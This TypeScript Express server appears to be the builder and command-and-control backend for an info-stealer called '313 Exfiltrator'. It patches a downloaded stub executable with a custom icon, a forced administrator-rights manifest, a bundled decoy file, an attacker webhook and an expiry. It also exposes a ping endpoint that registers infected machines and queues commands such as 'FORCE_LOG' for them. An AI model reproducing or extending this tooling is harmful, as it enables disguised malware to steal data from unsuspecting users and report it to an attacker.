import express, { Request, Response, NextFunction } from 'express';
import session from 'express-session';
import fs from 'fs-extra';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import axios from 'axios';
import multer from 'multer';
import * as ResEdit from 'resedit';
import postgres from 'postgres';
import dotenv from 'dotenv';

dotenv.config();

// --- CONFIGURAÇÃO DE CAMINHOS ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Garante que o Node encontre a pasta 'views' corretamente
const viewsPath = path.join(__dirname, 'views');

declare module 'express-session' {
  interface SessionData {
    authenticated: boolean;
    isAdmin: boolean;
    license_key: string;
    expiry: number;
    ip: string;
    username: string;
  }
}

const app = express();
const PORT = process.env.PORT || 3000;

// --- BANCO DE DADOS ---
const sql = postgres(process.env.DATABASE_URL as string, { ssl: 'require' });

// --- BINÁRIOS ---
const STUB_NAME = 'stub.exe';
const CARRIER_NAME = 'carrier.exe';
const BUILD_DIR = path.join(__dirname, 'generated_builds');

const STUB_URL = "https://github.com/brvnin/stubpublic/releases/download/1.0/stub.exe";
const CARRIER_URL = "https://github.com/brvnin/stubpublic/releases/download/carrier/carrier.exe";

if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR);

const upload = multer({ storage: multer.memoryStorage() });

// --- MIDDLEWARES ---
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || '313_secret_gate',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// --- AUTH MIDDLEWARE ---
const adminAuth = (req: Request, res: Response, next: NextFunction) => {
    if (req.session && req.session.isAdmin) return next();
    res.redirect('/login');
};

// --- PATCH ENGINE ---
async function patchBinary(webhook: string, expiry: string, buildId: string, icon: Buffer | null, decoy: Buffer | null) {
    try {
        const payloadData = fs.readFileSync(STUB_NAME);
        let baseBinary = decoy ? fs.readFileSync(CARRIER_NAME) : payloadData;

        const exe = ResEdit.NtExecutable.from(baseBinary);
        const resObj = ResEdit.NtExecutableResource.from(exe);

        if (icon) {
            const iconFile = ResEdit.Data.IconFile.from(icon);
            (ResEdit.Resource.IconGroupEntry as any).replaceIconsForResource(resObj.entries, 1, 1033, iconFile.icons);
        }

        const manifest = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly>`;
        const ResourceAny = ResEdit.Resource as any;
        if (ResourceAny.Manifest) {
            const manifestRes = new ResourceAny.Manifest();
            manifestRes.data = Buffer.from(manifest);
            manifestRes.id = 1;
            manifestRes.lang = 1033;
            manifestRes.outputResource(resObj.entries);
        }

        resObj.outputResource(exe);
        baseBinary = Buffer.from(exe.generate());

        const outputFilename = path.join(BUILD_DIR, `313_Exfiltrator_${buildId}.exe`);
        const writeStream = fs.createWriteStream(outputFilename);
        writeStream.write(baseBinary);

        if (decoy) {
            writeStream.write(Buffer.from('313_CLEAN_FILE:'));
            writeStream.write(decoy);
            writeStream.write(Buffer.from('313_PAYLOAD_FILE:'));
            writeStream.write(payloadData);
        }

        writeStream.write(Buffer.from('313_W_H_START:' + webhook));
        writeStream.write(Buffer.from('313_EXP_TIME:' + expiry));
        writeStream.end();

        return new Promise<string | null>((resolve) => {
            writeStream.on('finish', () => resolve(outputFilename));
            writeStream.on('error', () => resolve(null));
        });
    } catch (e) { return null; }
}

// --- ROTAS (CORRIGIDAS) ---

// Carrega a index.html da pasta views
app.get('/', (req, res) => {
    res.sendFile(path.join(viewsPath, 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(viewsPath, 'login.html'));
});

app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === process.env.ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        return res.redirect('/dashboard');
    }
    res.redirect('/login?error=InvalidPassword');
});

app.get('/dashboard', adminAuth, (req, res) => {
    res.sendFile(path.join(viewsPath, 'dashboard.html'));
});

// --- API C2 ---

app.post('/api/ping', async (req, res) => {
    const pc_name = String(req.body.pc_name || 'Unknown');
    const os_info = String(req.body.os_info || 'Unknown');
    const ip = String(req.headers['x-forwarded-for'] || req.socket.remoteAddress);

    try {
        const result = await sql`
            INSERT INTO nodes (pc_name, ip_address, os_info, last_ping)
            VALUES (${pc_name}, ${ip}, ${os_info}, NOW())
            ON CONFLICT (pc_name) 
            DO UPDATE SET last_ping = NOW(), ip_address = ${ip}, os_info = ${os_info}
            RETURNING pending_command
        `;
        res.json({ command: result[0]?.pending_command || 'IDLE' });
        if (result[0]?.pending_command !== 'IDLE') {
            await sql`UPDATE nodes SET pending_command = 'IDLE' WHERE pc_name = ${pc_name}`;
        }
    } catch (e) { res.status(500).json({ error: "DB Error" }); }
});

app.get('/api/nodes', adminAuth, async (req, res) => {
    try {
        const nodes = await sql`SELECT * FROM nodes ORDER BY last_ping DESC`;
        res.json(nodes);
    } catch (e) { res.status(500).send("DB Error"); }
});

app.post('/api/command', adminAuth, async (req, res) => {
    const pc_name = String(req.body.pc_name || '');
    await sql`UPDATE nodes SET pending_command = 'FORCE_LOG' WHERE pc_name = ${pc_name}`;
    res.json({ success: true });
});

app.post('/build', adminAuth, upload.fields([{ name: 'icon', maxCount: 1 }, { name: 'decoy', maxCount: 1 }]), async (req: any, res) => {
    const { webhook, expiry_days } = req.body;
    const buildId = crypto.randomBytes(4).toString('hex');
    const expiryTs = Math.floor(Date.now() / 1000) + (parseInt(expiry_days) * 86400);

    const icon = req.files['icon'] ? req.files['icon'][0].buffer : null;
    const decoy = req.files['decoy'] ? req.files['decoy'][0].buffer : null;

    const filePath = await patchBinary(webhook, expiryTs.toString(), buildId, icon, decoy);
    
    if (filePath) {
        res.download(filePath, `313_Exfiltrator.exe`, (err) => {
            if (!err && fs.existsSync(filePath)) fs.unlinkSync(filePath);
        });
    } else {
        res.status(500).send("Build error");
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy(() => res.redirect('/'));
});

// Inicialização
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n[313] CORE ACTIVE: http://localhost:${PORT}`);
});
